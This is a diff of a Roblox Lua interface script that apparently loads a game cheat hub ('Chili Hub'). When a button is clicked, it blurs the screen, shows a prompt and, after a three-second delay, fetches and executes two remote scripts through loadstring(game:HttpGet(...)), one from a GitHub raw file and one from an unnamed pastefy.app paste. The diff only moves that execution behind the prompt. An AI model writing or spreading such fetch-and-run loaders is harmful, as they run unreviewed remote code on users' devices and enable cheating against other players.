@@ -102,19 +102,19 @@ blur.Parent = Lighting
 
 --// Button Action
 button.MouseButton1Click:Connect(function()
-    -- Run both scripts
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
-    loadstring(game:HttpGet("https://pastefy.app/mRkXMG3f/raw"))()
-
-    -- Blur in
+    -- Blur in & show prompt instantly
     TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()
-
-    -- Show Prompt
     promptFrame.Visible = true
 
-    -- Wait 5s then remove
+    -- Wait 3s then run Chili Hub first
+    task.delay(3, function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+        -- Run second script immediately after Chili Hub
+        loadstring(game:HttpGet("https://pastefy.app/mRkXMG3f/raw"))()
+    end)
+
+    -- Remove blur + prompt after 5s
     task.delay(5, function()
-        -- Blur out
         TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
         promptFrame.Visible = false
     end)
